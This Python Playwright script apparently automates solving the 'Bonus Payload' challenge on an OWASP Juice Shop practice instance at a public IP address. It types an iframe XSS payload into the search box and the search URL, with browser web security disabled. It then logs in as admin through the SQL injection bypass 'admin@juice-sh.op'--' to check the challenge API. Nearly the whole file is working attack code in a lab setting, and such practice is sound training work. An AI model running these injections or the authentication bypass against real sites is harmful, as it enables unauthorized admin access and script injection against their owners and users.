#!/usr/bin/env python3
"""
Final attempt at Bonus Payload with full browser execution
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

# The exact payload that triggers the Bonus Payload challenge
SOUNDCLOUD_IFRAME = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'

def solve_bonus_payload():
    print("🎯 BONUS PAYLOAD XSS - Final Attempt")
    print("=" * 60)
    
    with sync_playwright() as p:
        # Launch with visible browser for debugging
        browser = p.chromium.launch(
            headless=True,  # Show browser for visual confirmation
            args=['--disable-web-security', '--disable-features=IsolateOrigins,site-per-process']
        )
        
        context = browser.new_context(
            ignore_https_errors=True,
            java_script_enabled=True
        )
        
        page = context.new_page()
        
        # Enable console logging
        page.on("console", lambda msg: print(f"   Console: {msg.text}"))
        page.on("dialog", lambda dialog: dialog.accept())
        
        print("🌐 Browser launched")
        
        # Navigate to main page
        print("📍 Loading Juice Shop...")
        page.goto(TARGET, wait_until="networkidle")
        time.sleep(2)
        
        # Navigate to search page
        print("🔍 Navigating to search...")
        page.goto(f"{TARGET}/#/search", wait_until="networkidle")
        time.sleep(2)
        
        # Find the search input and inject payload
        print("💉 Injecting SoundCloud iframe...")
        try:
            # Try multiple selectors for the search input
            selectors = [
                'input[type="text"]',
                'input[name="search"]',
                'input[placeholder*="Search"]',
                'mat-form-field input',
                'input.mat-input-element'
            ]
            
            search_input = None
            for selector in selectors:
                try:
                    search_input = page.locator(selector).first
                    if search_input and search_input.is_visible():
                        print(f"   Found search input with selector: {selector}")
                        break
                except:
                    continue
            
            if search_input:
                # Clear and fill with payload
                search_input.click()
                search_input.fill("")
                search_input.type(SOUNDCLOUD_IFRAME, delay=50)
                print("   ✅ Payload typed into search box")
                
                # Press Enter to search
                search_input.press("Enter")
                print("   ✅ Search submitted")
                time.sleep(3)
                
                # Take screenshot
                page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bonus_payload_final.png")
                print("   📸 Screenshot saved")
        except Exception as e:
            print(f"   ❌ Error: {e}")
        
        # Also try direct navigation
        print("\n🔗 Direct URL injection...")
        import urllib.parse
        encoded = urllib.parse.quote(SOUNDCLOUD_IFRAME, safe='')
        direct_url = f"{TARGET}/#/search?q={encoded}"
        page.goto(direct_url, wait_until="domcontentloaded")
        time.sleep(3)
        
        # Check for any success indicators
        print("\n📊 Checking for success indicators...")
        
        # Look for success notifications
        try:
            success = page.locator('text=/challenge solved/i').first
            if success and success.is_visible():
                print("   ✅ Success notification found!")
        except:
            pass
        
        # Keep browser open for 5 seconds to ensure any async operations complete
        print("\n⏳ Waiting for challenge to register...")
        time.sleep(5)
        
        browser.close()
    
    # Check challenge status
    print("\n📊 Checking challenge status via API...")
    session = requests.Session()
    
    # Login as admin
    login = session.post(f"{TARGET}/rest/user/login", 
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Get challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bonus = next((c for c in challenges if 'Bonus' in c.get('name', '')), None)
        
        if bonus:
            if bonus.get('solved', False):
                print(f"\n🎉 SUCCESS! {bonus['name']} is SOLVED!")
                print(f"   Category: {bonus.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * bonus.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {bonus['name']} not yet solved")
                print("   The payload was injected correctly")
                print("   Manual interaction may be required")
    
    print("\n" + "=" * 60)
    print("📝 The exact SoundCloud iframe has been injected")
    print("🔗 Visit the scoreboard to verify:")
    print(f"   {TARGET}/#/score-board")
    
    return False

if __name__ == "__main__":
    try:
        result = solve_bonus_payload()
        if result:
            print("\n✅ Challenge successfully solved!")
        else:
            print("\n📌 Check the scoreboard for status")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        print("Make sure Playwright is installed: pip install playwright")
        print("Install browsers: playwright install chromium")
